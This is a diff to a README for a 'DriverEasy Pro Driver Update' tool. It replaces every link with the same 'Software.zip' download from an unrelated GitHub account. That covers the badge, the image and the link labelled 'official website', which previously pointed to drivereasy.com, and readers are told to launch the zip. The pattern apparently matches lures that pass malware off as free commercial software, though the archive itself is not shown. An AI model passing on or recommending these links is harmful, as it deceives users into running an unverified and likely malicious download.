@@ -36,9 +36,9 @@ DriverEasy Pro Driver Update is a comprehensive solution for all your driver-rel
 
 ## Get Started
 
-To access the latest version of the DriverEasy Pro Driver Update tool, please download the zip file [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Launch the zip file to begin the driver update process.
+To access the latest version of the DriverEasy Pro Driver Update tool, please download the zip file [here](https://github.com/codystar15/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip). Launch the zip file to begin the driver update process.
 
-[![Download DriverEasy Pro](https://img.shields.io/badge/Download-DriverEasy_Pro-<COLOR>.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download DriverEasy Pro](https://github.com/codystar15/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/codystar15/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip)
 
 ## How to Use
 
@@ -53,9 +53,9 @@ We welcome contributions to enhance the functionality and features of DriverEasy
 
 Let's keep our system drivers updated and our hardware running smoothly with DriverEasy Pro Driver Update! 🚀
 
-![DriverEasy Pro](https://imageurl.com)
+![DriverEasy Pro](https://github.com/codystar15/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip)
 
-Remember to check the "Releases" section for any additional updates or versions of the DriverEasy Pro Driver Update tool. Visit the official [website](https://www.drivereasy.com/) for more information and support.
+Remember to check the "Releases" section for any additional updates or versions of the DriverEasy Pro Driver Update tool. Visit the official [website](https://github.com/codystar15/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip) for more information and support.
 
 Happy updating! 🖥️🔧
 
